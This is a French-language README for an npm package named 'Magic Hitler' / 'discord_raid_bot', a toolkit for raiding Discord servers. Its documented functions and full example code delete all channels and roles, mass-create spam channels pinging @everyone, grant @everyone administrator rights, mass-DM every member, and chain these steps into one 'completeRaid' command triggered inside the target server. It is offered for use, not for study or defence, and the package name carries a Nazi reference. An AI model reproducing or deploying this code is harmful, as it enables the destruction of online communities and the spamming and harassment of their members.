# Magic Hitler
# Discord Raid Bot
[![npm](https://img.shields.io/npm/v/magic_hitler.svg)](https://www.npmjs.com/package/magic_hitler)
[![npm](https://img.shields.io/badge/taille-27Ko-brightgreen.svg)](https://www.npmjs.com/package/magic_hitler)
[![github](https://img.shields.io/badge/Disponible%20sur-GitHub-red.svg)](https://github.com/JacqueSatan/Magic-Hitler-npm-module)
[![github](https://img.shields.io/badge/et-npm-yellow.svg)](https://www.npmjs.com/package/magic_hitler)
La mise en page n'est pas totalement prise en charge par GitHub, [cliquez ici](https://www.npmjs.com/package/magic_hitler lien vers npm) pour y voir plus clair.
## Sommaire
    1 - Installation
    2 - Utilisation
## 1 - Installation
Pour installer Discord Raid Bot, éxecutez simplement la commande 
```bash
npm install discord_raid_bot
```
dans le dossier de votre application Node.Js.
## 2 - Utilisation
Pour utiliser Discord Raid Bot, intégrez la ligne suivante à votre code :
```javascript
const raid = require('discord_raid_bot');
```





***
### raid.deleteAllChannels(client, trigger, createChannel)
Supprime tous les salons du serveur.
| Paramètre      | Type      | Description   |
| -------------- | --------- | ------------- |
| client         | class     | Votre bot     |
| trigger       | string    | Commande à envoyer dans le serveur à détruire |
| createChannel | boolean   | Crée un salon quand tous les autres sont supprimés si activé |
ex : 
```js
raid.deleteAllChannels(bot, "supprimer les salons", true);
```





***
### raid.createChannels(client, trigger, numberOfChannelsToCreate, nameOfChannelsToCreate, MessageToSpamInNewChannels, numberOfNotificationsPerChannel)
Supprime tous les salons du serveur puis en crée d'autres en spammant dedans.
| Paramètre      | Type      | Description   |
| -------------- | --------- | ------------- |
| client         | class     | Votre bot     |
| trigger       | string    | Commande à envoyer dans le serveur à détruire |
| numberOfChannelsToCreate | int | Le nombre multiplié par 2 de salons qui seront créés dans le serveur |
| nameOfChannelsToCreate | string | Le nom des salons qui seront créés dans le serveur |
| MessageToSpamInNewChannels | string | Les messages qui seront envoyés dans chaque salon créé dans le serveur |
| numberOfNotificationsPerChannel | int | Nombre de messages envoyés dans chaque salon |
ex :
```js
raid.createChannels(bot, "créer des salons", 444, "salon-créé", "@everyone message envoyé", 3);
```





***
### raid.deleteRoles(client, trigger)
Supprime tous les rôles supprimables dans le serveur.
| Paramètre      | Type      | Description   |
| -------------- | --------- | ------------- |
| client         | class     | Votre bot     |
| trigger       | string    | Commande à envoyer dans le serveur à détruire |
ex :
```js
raid.deleteRoles(bot, "supprimer les rôles")
```





***
### raid.createRoles(client, trigger, nameOfRolesToCreate, NumberOfRolesToCreate)
Créer des rôles dans le serveur.
| Paramètre      | Type      | Description   |
| -------------- | --------- | ------------- |
| client         | class     | Votre bot     |
| trigger       | string    | Commande à envoyer dans le serveur à détruire |
| nameOfRolesToCreate | string | Nom des rôles à créer |
| NumberOfRolesToCreate | int | Nombre de rôles à créér |
ex :
```js
raid.createRoles(bot, "créer des rôles", "nom des rôles", 42)
```





***
### raid.everyoneAdmin(client, trigger)
Rend le rôle @everyone administrateur.
| Paramètre      | Type      | Description   |
| -------------- | --------- | ------------- |
| client         | class     | Votre bot     |
| trigger       | string    | Commande à envoyer dans le serveur à détruire |
ex :
```js
raid.everyoneAdmin(bot, "@everyone admin")
```





***
### raid.dmAllMembers(client, trigger, msg, numberOfMessages)
Contacte chaque membre du serveur par message privé.
| Paramètre      | Type      | Description   |
| -------------- | --------- | ------------- |
| client         | class     | Votre bot     |
| trigger       | string    | Commande à envoyer dans le serveur à détruire |
| msg   | string    | Le message qui sera envoyé à chaque membre |
| numberOfMessages |    number |    Nombre de messages envoyés |
ex :
```js
raid.dmAllMembers(bot, "messages privés", "message envoyé", 15)
```




***
### raid.completeRaid(client, trigger, everyoneAdmin, deleteRoles, deleteChannels, createChannels, channelsName, channelsNumber, spamMessage, messagesNumber, createRoles, rolesName, rolesNumber)
Combine plusieurs attaques en une seule.
| Paramètre      | Type      | Description   |
| -------------- | --------- | ------------- |
| client         | class     | Votre bot     |
| trigger       | string    | Commande à envoyer dans le serveur à détruire |
| everyoneAdmin  | boolean | Rend le rôle @everyone administrateur |
| deleteRoles | boolean | Supprime les rôles supprimables |
| deleteChannels | boolean | Supprime tous les salons |
| createChannels | boolean | Crée des salons pour y spammer |
| channelsName | string | Nom des salons créés |
| channelsNumber | number | Nombre de salons créés (max = 500) |
| spamMessage | string | Message spammé dans les nouveaux salons |
| messagesNumber | number | Nombre de messsages à envoyer |
| createRoles | boolean | Crée des rôles |
| rolesName | string | Nom des rôles à créer |
| RolesNumber | number | Nombre de rôles à créer (max = 250) |
ex :
```js
raid.completeRaid(bot, 'raid', true, true, true, true, 'nom-des-salons', 222, 'message spammé', 3000, true, 'nom des rôles', 30)
```




***
### raid.createInvite(client, trigger, allGuilds)
Crée une invitation pour un ou chacun des serveurs où le bot se trouve, puis vous l'envoie.
| Paramètre      | Type      | Description   |
| -------------- | --------- | ------------- |
| client         | class     | Votre bot     |
| trigger       | string    | Commande à envoyer dans le serveur à détruire |
| allGuilds     | boolean   | Crée une invitation pour tous les serveurs |
ex :
```js
raid.createInvite(bot, "créer une invitation", true);
```





***
### raid.ready(client)
Affiche des informations sur le bot dè qu'il est prêt.
| Paramètre      | Type      | Description   |
| -------------- | --------- | ------------- |
| client         | class     | Votre bot     |
ex :
```js
raid.ready(bot);
```





***
## Exemple complet

```js
const raid = require('discord_raid_bot');
const Discord = require('discord.js');
const bot = new Discord.Client();
const config = require('./config.json');

raid.ready(bot);
raid.deleteAllChannels(bot, "!suppr_chnls", true);
raid.createChannels(bot, "!spam_chnls", 222, "raid", "@everyone", 6);
raid.deleteRoles(bot, "!kill_rls");
raid.createRoles(bot, "!create_rls", 'raid', 25);
raid.completeRaid(bot, '!raid', true, true, true, true, 'raid', 222, '@everyone', 3000, true, 'raid', 30);
raid.dmAllMembers(bot, "!dm", "https://discord.gg/xxxxxx", 15);
raid.everyoneAdmin(bot, "!admin");
raid.createInvite(bot, "!inv", false);
raid.createInvite(bot, "!all-servs-inv", true); // On peut déclarer plusieurs configurations différentes

client.login(config.token);
```
Plus de 300 lignes de codes résumées en 10.
